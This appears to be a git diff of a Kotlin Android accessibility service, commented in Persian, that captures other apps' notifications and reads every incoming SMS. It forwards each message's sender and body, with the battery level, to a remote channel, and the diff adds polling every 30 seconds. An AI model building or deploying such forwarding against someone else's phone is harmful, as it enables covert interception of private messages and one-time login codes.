@@ -4,12 +4,15 @@ import android.accessibilityservice.AccessibilityService
 import android.app.Notification
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.pm.PackageManager
 import android.database.ContentObserver
 import android.net.Uri
 import android.os.BatteryManager
 import android.os.Handler
+import android.os.Looper
 import android.provider.Telephony
 import android.view.accessibility.AccessibilityEvent
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 
 class NotiAccessibilityService : AccessibilityService() {
@@ -18,15 +21,26 @@ class NotiAccessibilityService : AccessibilityService() {
     private val scope = CoroutineScope(Dispatchers.IO + job)
     private var smsObserver: ContentObserver? = null
     private var lastSentSmsId: Long = -1
+    private val smsPollHandler = Handler(Looper.getMainLooper())
+    private var smsPollRunnable: Runnable? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         Sender.init(this)
         LogManager.add("AccessibilityService connected")
+
+        // بررسی مجوز READ_SMS
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            LogManager.add("READ_SMS permission granted")
+        } else {
+            LogManager.add("READ_SMS permission DENIED!")
+        }
+
         scope.launch {
             Sender.drainQueue()
         }
         registerSmsObserver()
+        startSmsPolling()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -34,13 +48,13 @@ class NotiAccessibilityService : AccessibilityService() {
 
         val packageName = event.packageName?.toString() ?: return
 
-        // فیلتر incallui (درخواستی شما)
+        // فیلتر incallui
         if (packageName == "com.android.incallui") {
             LogManager.add("Filtered out: $packageName")
             return
         }
 
-        // فیلتر کردن برنامهٔ پیش‌فرض پیامک (برای جلوگیری از ارسال تکراری)
+        // فیلتر کردن برنامهٔ پیش‌فرض پیامک
         if (packageName == getDefaultSmsAppPackage()) {
             LogManager.add("SMS notification filtered (direct read active)")
             return
@@ -68,11 +82,12 @@ class NotiAccessibilityService : AccessibilityService() {
         }
     }
 
-    // ========== خواندن مستقیم پیامک‌ها ==========
+    // ========== خواندن پیامک‌ها: Observer + Polling ==========
     private fun registerSmsObserver() {
         smsObserver = object : ContentObserver(Handler()) {
             override fun onChange(selfChange: Boolean, uri: Uri?) {
                 super.onChange(selfChange, uri)
+                LogManager.add("SMS ContentObserver triggered")
                 readLatestSms()
             }
         }
@@ -82,11 +97,27 @@ class NotiAccessibilityService : AccessibilityService() {
             smsObserver!!
         )
         LogManager.add("SMS observer registered")
-        // خواندن آخرین پیامک موجود برای تنظیم شناسه
+        // بار اول فقط شناسه آخرین پیامک را ذخیره کن
         readLatestSms(updateLastIdOnly = true)
     }
 
+    private fun startSmsPolling() {
+        smsPollRunnable = object : Runnable {
+            override fun run() {
+                readLatestSms()
+                smsPollHandler.postDelayed(this, 30_000) // هر ۳۰ ثانیه
+            }
+        }
+        smsPollHandler.postDelayed(smsPollRunnable!!, 30_000)
+        LogManager.add("SMS polling started (every 30s)")
+    }
+
     private fun readLatestSms(updateLastIdOnly: Boolean = false) {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            LogManager.add("Cannot read SMS: permission missing")
+            return
+        }
+
         scope.launch {
             withContext(Dispatchers.IO) {
                 try {
@@ -102,17 +133,15 @@ class NotiAccessibilityService : AccessibilityService() {
                             val id = it.getLong(0)
                             if (updateLastIdOnly) {
                                 lastSentSmsId = id
-                                LogManager.add("SMS observer initialized with id=$id")
+                                LogManager.add("SMS initialized with id=$id")
                                 return@withContext
                             }
-                            // اگر پیام جدید است (شناسه بزرگتر از آخرین ارسالی)
                             if (id > lastSentSmsId) {
                                 lastSentSmsId = id
                                 val address = it.getString(1) ?: "ناشناس"
                                 val body = it.getString(2) ?: ""
                                 val date = it.getLong(3)
-                                LogManager.add("New SMS from $address")
-                                // ارسال به کانال
+                                LogManager.add("New SMS from $address (id=$id)")
                                 Sender.send(
                                     "پیامک دریافتی",
                                     "com.android.sms",
@@ -121,6 +150,8 @@ class NotiAccessibilityService : AccessibilityService() {
                                     date,
                                     getBatteryLevel()
                                 )
+                            } else {
+                                LogManager.add("No new SMS (last id=$lastSentSmsId, db id=$id)")
                             }
                         }
                     }
@@ -169,9 +200,8 @@ class NotiAccessibilityService : AccessibilityService() {
 
     override fun onDestroy() {
         super.onDestroy()
-        smsObserver?.let {
-            contentResolver.unregisterContentObserver(it)
-        }
+        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
+        smsPollRunnable?.let { smsPollHandler.removeCallbacks(it) }
         job.cancel()
         LogManager.add("AccessibilityService destroyed")
     }
